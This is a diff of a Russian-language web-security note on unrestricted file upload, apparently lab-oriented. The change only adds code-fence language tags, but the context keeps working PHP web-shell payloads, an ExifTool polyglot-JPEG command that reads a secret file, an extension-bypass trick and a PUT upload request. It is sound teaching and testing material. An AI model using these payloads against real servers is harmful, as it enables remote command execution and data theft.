@@ -2,7 +2,7 @@
 
 # Эксплуатация неограниченной загрузки файлов для развертывания веб-оболочки
 
-```
+```php
 <?php echo file_get_contents('/path/to/target/file'); ?>
 <?php echo system($_GET['command']); ?>
 GET /example/exploit.php?command=id HTTP/1.1
@@ -53,7 +53,7 @@ Content-Type: application/x-httpd-php
 
 На серверах IIS с помощью файла `web.config`:
 
-```
+```xml
 <staticContent>
 	<mimeMap fileExtension=".json" mimeType="application/json" />
 </staticContent>`
@@ -96,7 +96,7 @@ exploit.p.phphp
 ## Неправильная проверка содержимого файла
 С помощью специальных инструментов, таких как ExifTool, можно легко создать полиглотный файл JPEG, содержащий вредоносный код в своих метаданных:
 
-```
+```bash
 exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" kitten.jpg -o polyglot.php
 ```
 
@@ -117,12 +117,12 @@ exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret'
 # Загрузка файлов с помощью PUT
 Стоит отметить, что некоторые веб-серверы могут быть настроены на поддержку запросов PUT. При отсутствии соответствующей защиты это может стать альтернативным способом загрузки вредоносных файлов, даже если функция загрузки недоступна через веб-интерфейс:
 
-```
+```http
 PUT /images/exploit.php HTTP/1.1
 Host: vulnerable-website.com
 Content-Type: application/x-httpd-php
 Content-Length: 49
-	
+
 <?php echo file_get_contents('/path/to/file'); ?>
 ```
 
